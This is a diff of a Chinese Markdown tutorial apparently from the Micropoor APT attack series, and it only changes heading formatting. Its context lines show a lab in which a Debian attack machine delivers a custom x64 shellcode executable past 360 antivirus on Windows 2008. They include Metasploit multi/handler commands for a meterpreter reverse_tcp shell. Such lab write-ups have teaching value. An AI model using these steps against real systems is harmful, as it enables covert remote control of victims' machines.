@@ -1,7 +1,4 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
-**攻击机：** 192.168.1.4 Debian
+**攻击机：** 192.168.1.4 Debian  
 **靶机：** 192.168.1.2 Windows 2008
 
 目标机安装：360卫士+360杀毒
@@ -83,14 +80,14 @@ C:\ 的目录
 ![](media/cca6a60ee58ce571009ab193896b7baa.jpg)
 
 
-**目标机位x64位 Windows 2008**
+### 目标机位x64位 Windows 2008
 ```bash
 C:\> ver 
 Microsoft Windows [版本 6.1.7600]
 ```
 ![](media/4a16182f9ad9671797b1009dedbc44af.jpg)
 
-**配置payload：**
+### 配置payload：
 
 ```ruby
 root@John:/var/www/html# cat ./Micropoor_rev.rb
@@ -139,10 +136,10 @@ Listening on 8080.
 
 ![](media/e7b69c4c0bb14566cc3b480dccc4a809.jpg)
 
-**上传Micropoor_shellcode_x64.exe**
+### 上传Micropoor_shellcode_x64.exe
 ![](media/01ffba050adaf0936dc24796dab89b68.jpg)
 
-**配置msf：**
+### 配置msf：
 ```bash
 msf exploit(multi/handler) > use exploit/multi/handler
 msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
@@ -174,7 +171,7 @@ msf exploit(multi/handler) > exploit
 
 ![](media/432b68991b56bfd1a2a240a7b2df7b7c.jpg)
 
-**靶机执行：**
+### 靶机执行：
 ![](media/b70b9832e6637a1ce16f852decdfb53b.jpg)
 
 ```bash
@@ -282,11 +279,11 @@ meterpreter >
 ```
 ![](media/92b08ed12094b305ffb3f0979797c9f3.jpg)
 
-**靶机：**
+### 靶机：
 
 ![](media/7db4df2368b755bc5c4497c0064a98f9.jpg)
 
-## 附录：
+### 附录：
 
 Micropoor_shellcode for payload backdoor
 
